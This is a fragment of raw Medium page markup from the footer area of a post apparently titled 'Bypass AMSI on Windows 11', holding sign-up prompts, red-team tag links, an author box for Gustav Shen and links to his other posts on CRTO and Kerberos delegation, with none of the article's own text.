296.52-294.5 296.52S5.8 472 5.8 308.2 137.65 11.69 300.29 11.69s294.5 132.75 294.5 296.51M917.86 308.2c0 154.16-65.93 279.12-147.25 279.12s-147.25-125-147.25-279.12S689.29 29.08 770.61 29.08s147.25 125 147.25 279.12M1050 308.2c0 138.12-23.19 250.08-51.79 250.08s-51.79-112-51.79-250.08 23.19-250.08 51.8-250.08S1050 170.09 1050 308.2M1862.77 37.4l.82-.18v-6.35h-167.48l-155.51 365.5-155.51-365.5h-180.48v6.35l.81.18c30.57 6.9 46.09 17.19 46.09 54.3v434.45c0 37.11-15.58 47.4-46.15 54.3l-.81.18V587H1327v-6.35l-.81-.18c-30.57-6.9-46.09-17.19-46.09-54.3V116.9L1479.87 587h11.33l205.59-483.21V536.9c-2.62 29.31-18 38.36-45.68 44.61l-.82.19v6.3h213.3v-6.3l-.82-.19c-27.71-6.25-43.46-15.3-46.08-44.61l-.14-445.2h.14c0-37.11 15.52-47.4 46.08-54.3m97.43 287.8c3.49-78.06 31.52-134.4 78.56-135.37 14.51.24 26.68 5 36.14 14.16 20.1 19.51 29.55 60.28 28.09 121.21zm-2.11 22h250v-1.05c-.71-59.69-18-106.12-51.34-138-28.82-27.55-71.49-42.71-116.31-42.71h-1c-23.26 0-51.79 5.64-72.09 15.86-23.11 10.7-43.49 26.7-60.45 47.7-27.3 33.83-43.84 79.55-47.86 130.93-.13 1.54-.24 3.08-.35 4.62s-.18 2.92-.25 4.39a332.64 332.64 0 0 0-.36 21.69C1860.79 507 1923.65 600 2035.3 600c98 0 155.07-71.64 169.3-167.8l-7.19-2.53c-25 51.68-69.9 83-121 79.18-69.76-5.22-123.2-75.95-118.35-161.63m532.69 157.68c-8.2 19.45-25.31 30.15-48.24 30.15s-43.89-15.74-58.78-44.34c-16-30.7-24.42-74.1-24.42-125.51 0-107 33.28-176.21 84.79-176.21 21.57 0 38.55 10.7 46.65 29.37zm165.84 76.28c-30.57-7.23-46.09-18-46.09-57V5.28L2424.77 60v6.7l1.14-.09c25.62-2.07 43 1.47 53.09 10.79 7.9 7.3 11.75 18.5 11.75 34.26v71.14c-18.31-11.69-40.09-17.38-66.52-17.38-53.6 0-102.59 22.57-137.92 63.56-36.83 42.72-56.3 101.1-56.3 168.81C2230 518.72 2289.53 600 2378.13 600c51.83 0 93.53-28.4 112.62-76.3V588h166.65v-6.66zm159.29-505.33c0-37.76-28.47-66.24-66.24-66.24-37.59 0-67 29.1-67 66.24s29.44 66.24 67 66.24c37.77 0 66.24-28.48 66.24-66.24m43.84 505.33c-30.57-7.23-46.09-18-46.09-57h-.13V166.65l-166.66 47.85v6.5l1 .09c36.06 3.21 45.93 15.63 45.93 57.77V588h166.8v-6.66zm427.05 0c-30.57-7.23-46.09-18-46.09-57V166.65L3082 212.92v6.52l.94.1c29.48 3.1 38 16.23 38 58.56v226c-9.83 19.45-28.27 31-50.61 31.78-36.23 0-56.18-24.47-56.18-68.9V166.66l-166.66 47.85V221l1 .09c36.06 3.2 45.94 15.62 45.94 57.77v191.27a214.48 214.48 0 0 0 3.47 39.82l3 13.05c14.11 50.56 51.08 77 109 77 49.06 0 92.06-30.37 111-77.89v66h166.66v-6.66zM3934.2 588v-6.67l-.81-.19c-33.17-7.65-46.09-22.07-46.09-51.43v-243.2c0-75.83-42.59-121.09-113.93-121.09-52 0-95.85 30.05-112.73 76.86-13.41-49.6-52-76.86-109.06-76.86-50.12 0-89.4 26.45-106.25 71.13v-69.87l-166.66 45.89v6.54l1 .09c35.63 3.16 45.93 15.94 45.93 57V588h155.5v-6.66l-.82-.2c-26.46-6.22-35-17.56-35-46.66V255.72c7-16.35 21.11-35.72 49-35.72 34.64 0 52.2 24 52.2 71.28V588h155.54v-6.66l-.82-.2c-26.46-6.22-35-17.56-35-46.66v-248a160.45 160.45 0 0 0-2.2-27.68c7.42-17.77 22.34-38.8 51.37-38.8 35.13 0 52.2 23.31 52.2 71.28V588z"></path></svg><h2 class="vc b nj vd ve nn vf vg mt vh vi mx vj vk nb vl vm vn vo">Sign up to discover human stories that deepen your understanding of the world.</h2></div><div class="ab q iv iw"><div class="vp gb bm gv vq ha vr vs vt vu vv vw vx l c"><div class="ab q"><h2 class="bc sp il z gq bh">Free</h2></div><div class="st vy l cu"></div><div class="st ab"><div class="bl l"><svg width="11" height="11" viewBox="0 0 11 11"><path d="M0 6.31l3.7 3.7.9.91.67-1.1 5.3-8.79L8.84 0l-5.3 8.8 1.57-.2-3.7-3.7L0 6.3z"></path></svg></div><p class="bc b bd z bh">Distraction-free reading. No ads.</p></div><div class="st ab"><div class="bl l"><svg width="11" height="11" viewBox="0 0 11 11"><path d="M0 6.31l3.7 3.7.9.91.67-1.1 5.3-8.79L8.84 0l-5.3 8.8 1.57-.2-3.7-3.7L0 6.3z"></path></svg></div><p class="bc b bd z bh">Organize your knowledge with lists and highlights.</p></div><div class="st ab"><div class="bl l"><svg width="11" height="11" viewBox="0 0 11 11"><path d="M0 6.31l3.7 3.7.9.91.67-1.1 5.3-8.79L8.84 0l-5.3 8.8 1.57-.2-3.7-3.7L0 6.3z"></path></svg></div><p class="bc b bd z bh">Tell your story. Find your audience.</p></div><div class="ci vz vy l cu"></div><span><button class="bc b bd z wa qt wb wc wd we wf es et wg wh wi ex be ey ez fa bj fb fc">Sign up for free</button></span></div><div class="vp gb bm vq vr vt vv vx l c"><div class="ab q"><svg width="64" height="64" viewBox="0 0 64 64" fill="none" class="wj qs de lh"><path d="M39.64 40.83L33.87 56.7a1.99 1.99 0 0 1-3.74 0l-5.77-15.87a2.02 2.02 0 0 0-1.2-1.2L7.3 33.88a1.99 1.99 0 0 1 0-3.74l15.87-5.77a2.02 2.02 0 0 0 1.2-1.2L30.12 7.3a1.99 1.99 0 0 1 3.74 0l5.77 15.87a2.02 2.02 0 0 0 1.2 1.2l15.86 5.76a1.99 1.99 0 0 1 0 3.74l-15.87 5.77a2.02 2.02 0 0 0-1.2 1.2z" fill="#FFC017"></path></svg><h2 class="bc sp il z gq bh">Membership</h2></div><div class="st vy l cu"></div><div class="st ab"><div class="bl l"><svg width="11" height="11" viewBox="0 0 11 11"><path d="M0 6.31l3.7 3.7.9.91.67-1.1 5.3-8.79L8.84 0l-5.3 8.8 1.57-.2-3.7-3.7L0 6.3z"></path></svg></div><p class="bc b bd z bh">Access the best member-only stories.</p></div><div class="st ab"><div class="bl l"><svg width="11" height="11" viewBox="0 0 11 11"><path d="M0 6.31l3.7 3.7.9.91.67-1.1 5.3-8.79L8.84 0l-5.3 8.8 1.57-.2-3.7-3.7L0 6.3z"></path></svg></div><p class="bc b bd z bh">Support independent authors.</p></div><div class="st ab"><div class="bl l"><svg width="11" height="11" viewBox="0 0 11 11"><path d="M0 6.31l3.7 3.7.9.91.67-1.1 5.3-8.79L8.84 0l-5.3 8.8 1.57-.2-3.7-3.7L0 6.3z"></path></svg></div><p class="bc b bd z bh">Listen to audio narrations.</p></div><div class="st ab"><div class="bl l"><svg width="11" height="11" viewBox="0 0 11 11"><path d="M0 6.31l3.7 3.7.9.91.67-1.1 5.3-8.79L8.84 0l-5.3 8.8 1.57-.2-3.7-3.7L0 6.3z"></path></svg></div><p class="bc b bd z bh">Read offline.</p></div><div class="st ab"><div class="bl l"><svg width="11" height="11" viewBox="0 0 11 11"><path d="M0 6.31l3.7 3.7.9.91.67-1.1 5.3-8.79L8.84 0l-5.3 8.8 1.57-.2-3.7-3.7L0 6.3z"></path></svg></div><p class="bc b bd z bh">Join the Partner Program and earn for your writing.</p></div><div class="ci vz vy l cu"></div><span><button class="bc b bd z wa qt wb wc wd we wf es et wg wh wi ex be ey ez fa bj fb fc">Try for 5&nbsp;$/month</button></span></div></div></div></div></div></div></div><div class="ab by"><div class="cf be fw fx fy fz"><div class="qp qq ab ix"><div class="qr ab"><a class="qs av am ao" href="https://medium.com/tag/red-team?source=post_page-----75d231b2cac6---------------red_team-----------------" rel="noopener follow"><div class="qt fg cu qu gb qv qw bc b bd z bh qx">Red Team</div></a></div><div class="qr ab"><a class="qs av am ao" href="https://medium.com/tag/offsec?source=post_page-----75d231b2cac6---------------offsec-----------------" rel="noopener follow"><div class="qt fg cu qu gb qv qw bc b bd z bh qx">Offsec</div></a></div><div class="qr ab"><a class="qs av am ao" href="https://medium.com/tag/offensive-security?source=post_page-----75d231b2cac6---------------offensive_security-----------------" rel="noopener follow"><div class="qt fg cu qu gb qv qw bc b bd z bh qx">Offensive Security</div></a></div><div class="qr ab"><a class="qs av am ao" href="https://medium.com/tag/cybersecurity?source=post_page-----75d231b2cac6---------------cybersecurity-----------------" rel="noopener follow"><div class="qt fg cu qu gb qv qw bc b bd z bh qx">Cybersecurity</div></a></div></div></div></div><div class="l"></div><footer class="qy qz ra rb rc rd re rf rg ab q rh ri c"><div class="l ae"><div class="ab by"><div class="cf be fw fx fy fz"><div class="ab cm rj"><div class="ab q kg"><div class="rk l"><span class="l rl rm rn e d"><div class="ab q kg kh"><div class="pw-multi-vote-icon fg ki kj kk kl"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F75d231b2cac6&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;user=Gustav+Shen&amp;userId=39cded15042e&amp;source=-----75d231b2cac6---------------------clap_footer-----------" rel="noopener follow"><div><div class="bj" aria-hidden="false" aria-describedby="8" aria-labelledby="8"><div class="km ao kn ko kp kq am kr ks kt kl"><svg width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.37.83L12 3.28l.63-2.45h-1.26zM13.92 3.95l1.52-2.1-1.18-.4-.34 2.5zM8.59 1.84l1.52 2.11-.34-2.5-1.18.4zM18.52 18.92a4.23 4.23 0 0 1-2.62 1.33l.41-.37c2.39-2.4 2.86-4.95 1.4-7.63l-.91-1.6-.8-1.67c-.25-.56-.19-.98.21-1.29a.7.7 0 0 1 .55-.13c.28.05.54.23.72.5l2.37 4.16c.97 1.62 1.14 4.23-1.33 6.7zm-11-.44l-4.15-4.15a.83.83 0 0 1 1.17-1.17l2.16 2.16a.37.37 0 0 0 .51-.52l-2.15-2.16L3.6 11.2a.83.83 0 0 1 1.17-1.17l3.43 3.44a.36.36 0 0 0 .52 0 .36.36 0 0 0 0-.52L5.29 9.51l-.97-.97a.83.83 0 0 1 0-1.16.84.84 0 0 1 1.17 0l.97.97 3.44 3.43a.36.36 0 0 0 .51 0 .37.37 0 0 0 0-.52L6.98 7.83a.82.82 0 0 1-.18-.9.82.82 0 0 1 .76-.51c.22 0 .43.09.58.24l5.8 5.79a.37.37 0 0 0 .58-.42L13.4 9.67c-.26-.56-.2-.98.2-1.29a.7.7 0 0 1 .55-.13c.28.05.55.23.73.5l2.2 3.86c1.3 2.38.87 4.59-1.29 6.75a4.65 4.65 0 0 1-4.19 1.37 7.73 7.73 0 0 1-4.07-2.25zm3.23-12.5l2.12 2.11c-.41.5-.47 1.17-.13 1.9l.22.46-3.52-3.53a.81.81 0 0 1-.1-.36c0-.23.09-.43.24-.59a.85.85 0 0 1 1.17 0zm7.36 1.7a1.86 1.86 0 0 0-1.23-.84 1.44 1.44 0 0 0-1.12.27c-.3.24-.5.55-.58.89-.25-.25-.57-.4-.91-.47-.28-.04-.56 0-.82.1l-2.18-2.18a1.56 1.56 0 0 0-2.2 0c-.2.2-.33.44-.4.7a1.56 1.56 0 0 0-2.63.75 1.6 1.6 0 0 0-2.23-.04 1.56 1.56 0 0 0 0 2.2c-.24.1-.5.24-.72.45a1.56 1.56 0 0 0 0 2.2l.52.52a1.56 1.56 0 0 0-.75 2.61L7 19a8.46 8.46 0 0 0 4.48 2.45 5.18 5.18 0 0 0 3.36-.5 4.89 4.89 0 0 0 4.2-1.51c2.75-2.77 2.54-5.74 1.43-7.59L18.1 7.68z"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ku kv kw kx ky kz la"><div><div class="bj" aria-hidden="false" aria-describedby="66" aria-labelledby="66"><p class="bc b ds z dr"><button class="af ag ah ai aj ak al am an ao ap aq ar as at yk li">114<span class="l h g f ro rp"></span></button></p></div></div></div></div></span><span class="l h g f ro rp"><div class="ab q kg kh"><div class="pw-multi-vote-icon fg ki kj kk kl"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F75d231b2cac6&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;user=Gustav+Shen&amp;userId=39cded15042e&amp;source=-----75d231b2cac6---------------------clap_footer-----------" rel="noopener follow"><div><div class="bj" aria-hidden="false" aria-describedby="9" aria-labelledby="9"><div class="km ao kn ko kp kq am kr ks kt kl"><svg width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.37.83L12 3.28l.63-2.45h-1.26zM13.92 3.95l1.52-2.1-1.18-.4-.34 2.5zM8.59 1.84l1.52 2.11-.34-2.5-1.18.4zM18.52 18.92a4.23 4.23 0 0 1-2.62 1.33l.41-.37c2.39-2.4 2.86-4.95 1.4-7.63l-.91-1.6-.8-1.67c-.25-.56-.19-.98.21-1.29a.7.7 0 0 1 .55-.13c.28.05.54.23.72.5l2.37 4.16c.97 1.62 1.14 4.23-1.33 6.7zm-11-.44l-4.15-4.15a.83.83 0 0 1 1.17-1.17l2.16 2.16a.37.37 0 0 0 .51-.52l-2.15-2.16L3.6 11.2a.83.83 0 0 1 1.17-1.17l3.43 3.44a.36.36 0 0 0 .52 0 .36.36 0 0 0 0-.52L5.29 9.51l-.97-.97a.83.83 0 0 1 0-1.16.84.84 0 0 1 1.17 0l.97.97 3.44 3.43a.36.36 0 0 0 .51 0 .37.37 0 0 0 0-.52L6.98 7.83a.82.82 0 0 1-.18-.9.82.82 0 0 1 .76-.51c.22 0 .43.09.58.24l5.8 5.79a.37.37 0 0 0 .58-.42L13.4 9.67c-.26-.56-.2-.98.2-1.29a.7.7 0 0 1 .55-.13c.28.05.55.23.73.5l2.2 3.86c1.3 2.38.87 4.59-1.29 6.75a4.65 4.65 0 0 1-4.19 1.37 7.73 7.73 0 0 1-4.07-2.25zm3.23-12.5l2.12 2.11c-.41.5-.47 1.17-.13 1.9l.22.46-3.52-3.53a.81.81 0 0 1-.1-.36c0-.23.09-.43.24-.59a.85.85 0 0 1 1.17 0zm7.36 1.7a1.86 1.86 0 0 0-1.23-.84 1.44 1.44 0 0 0-1.12.27c-.3.24-.5.55-.58.89-.25-.25-.57-.4-.91-.47-.28-.04-.56 0-.82.1l-2.18-2.18a1.56 1.56 0 0 0-2.2 0c-.2.2-.33.44-.4.7a1.56 1.56 0 0 0-2.63.75 1.6 1.6 0 0 0-2.23-.04 1.56 1.56 0 0 0 0 2.2c-.24.1-.5.24-.72.45a1.56 1.56 0 0 0 0 2.2l.52.52a1.56 1.56 0 0 0-.75 2.61L7 19a8.46 8.46 0 0 0 4.48 2.45 5.18 5.18 0 0 0 3.36-.5 4.89 4.89 0 0 0 4.2-1.51c2.75-2.77 2.54-5.74 1.43-7.59L18.1 7.68z"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ku kv kw kx ky kz la"><div><div class="bj" aria-hidden="false" aria-describedby="68" aria-labelledby="68"><p class="bc b ds z dr"><button class="af ag ah ai aj ak al am an ao ap aq ar as at yk li">114</button></p></div></div></div></div></span></div><div class="bn ab"><div><div class="bj" aria-hidden="false" aria-describedby="10" aria-labelledby="10"><button class="ao km lc ld ab q fh le lf" aria-label="responses"><svg width="24" height="24" viewBox="0 0 24 24" class="lg"><path d="M18 16.8a7.14 7.14 0 0 0 2.24-5.32c0-4.12-3.53-7.48-8.05-7.48C7.67 4 4 7.36 4 11.48c0 4.13 3.67 7.48 8.2 7.48a8.9 8.9 0 0 0 2.38-.32c.23.2.48.39.75.56 1.06.69 2.2 1.04 3.4 1.04.22 0 .4-.11.48-.29a.5.5 0 0 0-.04-.52 6.4 6.4 0 0 1-1.16-2.65v.02zm-3.12 1.06l-.06-.22-.32.1a8 8 0 0 1-2.3.33c-4.03 0-7.3-2.96-7.3-6.59S8.17 4.9 12.2 4.9c4 0 7.1 2.96 7.1 6.6 0 1.8-.6 3.47-2.02 4.72l-.2.16v.26l.02.3a6.74 6.74 0 0 0 .88 2.4 5.27 5.27 0 0 1-2.17-.86c-.28-.17-.72-.38-.94-.59l.01-.02z"></path></svg></button></div></div></div></div><div class="ab q"><div class="rq l iu"><div><div class="bj" aria-hidden="false" aria-describedby="11" aria-labelledby="11"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F75d231b2cac6&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;source=--------------------------bookmark_footer-----------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div><div class="rq l iu"><div class="bj" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bj" aria-hidden="false" aria-describedby="12" aria-labelledby="12"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fh ah ai aj ak al lq an ao ap eu lr ls lf lt"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M15.22 4.93a.42.42 0 0 1-.12.13h.01a.45.45 0 0 1-.29.08.52.52 0 0 1-.3-.13L12.5 3v7.07a.5.5 0 0 1-.5.5.5.5 0 0 1-.5-.5V3.02l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.8a.42.42 0 0 1 .07.5zm-.1.14zm.88 2h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11a2 2 0 0 1-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.14c.1.1.15.22.15.35a.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9V8.96c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1z" fill="currentColor"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="rr rs rt ru rv l bu"><div class="ab by"><div class="cf be fw fx fy fz"><div class="ci ab rw cm"><div class="ab ic"><a rel="noopener follow" href="/?source=post_page-----75d231b2cac6--------------------------------"><div class="l rx ry bv rz ig"><div class="l fg"><img alt="Gustav Shen" class="l fa bv sa sb cu" src="https://miro.medium.com/v2/resize:fill:144:144/1*QVBOkkcMPzE3HYxh1TH2Sg.jpeg" width="72" height="72" loading="lazy"><div class="ih bv l sa sb fp n ii fq"></div></div></div></a></div><div class="j i d"><div class="ab"><span><button class="bc b bd z el qt em eo ep eq er es et eu ev ew ex sc ey ez fa bj fb fc">Follow</button></span><div class="dq l"><div><div><div class="bj" aria-hidden="false" aria-describedby="149" aria-labelledby="149"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F8e26c8f7717e&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;newsletterV3=39cded15042e&amp;newsletterV3Id=8e26c8f7717e&amp;user=Gustav+Shen&amp;userId=39cded15042e&amp;source=-----75d231b2cac6---------------------subscribe_user-----------" rel="noopener follow"><button class="bc b bd z el am em eo ep eq er es et eu ev ew ex ey ez fa bj fb fc" aria-label="Subscribe"><svg width="38" height="38" viewBox="0 0 38 38" fill="none" class="ym se sf"><rect x="26.25" y="9.25" width="0.5" height="6.5" rx="0.25"></rect><rect x="29.75" y="12.25" width="0.5" height="6.5" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5L19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="ab ck cm"><div class="l"><div class="ab q"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/?source=post_page-----75d231b2cac6--------------------------------"><h2 class="pw-author-name bc sp sq sr ss bh"><span class="gk iz">Written by <!-- -->Gustav Shen</span></h2></a></div><div class="qr ab"><div class="l iu"><span class="pw-follower-count bc b bd z bh"><a class="af ag ah ai aj ak al am an ao ap aq ar in" rel="noopener follow" href="/followers?source=post_page-----75d231b2cac6--------------------------------">222 Followers</a></span></div></div><div class="st l"><p class="bc b bd z bh"><span class="gk">Red Team @ World Bank</span></p></div></div><div class="h k"><div class="ab"><span><button class="bc b bd z el qt em eo ep eq er es et eu ev ew ex sc ey ez fa bj fb fc">Follow</button></span><div class="dq l"><div><div><div class="bj" aria-hidden="false" aria-describedby="150" aria-labelledby="150"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F8e26c8f7717e&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;newsletterV3=39cded15042e&amp;newsletterV3Id=8e26c8f7717e&amp;user=Gustav+Shen&amp;userId=39cded15042e&amp;source=-----75d231b2cac6---------------------subscribe_user-----------" rel="noopener follow"><button class="bc b bd z el am em eo ep eq er es et eu ev ew ex ey ez fa bj fb fc" aria-label="Subscribe"><svg width="38" height="38" viewBox="0 0 38 38" fill="none" class="ym se sf"><rect x="26.25" y="9.25" width="0.5" height="6.5" rx="0.25"></rect><rect x="29.75" y="12.25" width="0.5" height="6.5" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5L19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="su be sv sw sx sy sz ta"></div></div></div><div class="ab by"><div class="cf be fw fx fy fz"><div class="yn yo l"><h2 class="bc sp il z gq bh">More from Gustav Shen</h2></div><div class="yp ab kg ix yq yr ys yt yu yv yw yx yy yz za zb zc zd ze"><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://gustavshen.medium.com/my-crto-course-and-exam-review-433f967f712e" tabindex="0"><div class="abq"><div aria-label="My CRTO course and exam review"><div class="abs abt abu abv abw"><img alt="My CRTO course and exam review" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*GBGQ7T9n2hVN4CSmPNS2JQ.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="91" aria-labelledby="91"><a tabindex="-1" rel="noopener follow" href="/?source=author_recirc-----75d231b2cac6----0---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><div class="l fg"><img alt="Gustav Shen" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/1*QVBOkkcMPzE3HYxh1TH2Sg.jpeg" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="92" aria-labelledby="92"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" rel="noopener follow" href="/?source=author_recirc-----75d231b2cac6----0---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><p class="bc b ds z acm acn aco acp acq acr acs act bh">Gustav Shen</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/my-crto-course-and-exam-review-433f967f712e?source=author_recirc-----75d231b2cac6----0---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">My CRTO course and exam review</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">Motivation of The Journey</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Jan 25, 2022</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" rel="noopener follow" href="/my-crto-course-and-exam-review-433f967f712e?source=author_recirc-----75d231b2cac6----0---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="93" aria-labelledby="93"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F433f967f712e&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fmy-crto-course-and-exam-review-433f967f712e&amp;source=-----75d231b2cac6----0-----------------bookmark_preview----1947e925_9d52_4264_bbca_f325db8ba523-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span><div class="j i d"><div class="su be sv lg"></div></div></div></div></div></div></div></div></article></div></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://gustavshen.medium.com/delegation-1ff294e3defd" tabindex="0"><div class="abq"><div aria-label="Kerberos Delegation"><div class="abs abt abu abv abw"><img alt="Kerberos Delegation" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*yZADv5I5OyPMJO1kD-qRDw.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="94" aria-labelledby="94"><a tabindex="-1" rel="noopener follow" href="/?source=author_recirc-----75d231b2cac6----1---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><div class="l fg"><img alt="Gustav Shen" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/1*QVBOkkcMPzE3HYxh1TH2Sg.jpeg" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="95" aria-labelledby="95"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" rel="noopener follow" href="/?source=author_recirc-----75d231b2cac6----1---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><p class="bc b ds z acm acn aco acp acq acr acs act bh">Gustav Shen</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/delegation-1ff294e3defd?source=author_recirc-----75d231b2cac6----1---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">Kerberos Delegation</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">Hey friends, it is the 3rd article in my Active Directory Theory and Exploitation series. Today, I would like to talk about 3 types of…</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Aug 29, 2022</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a 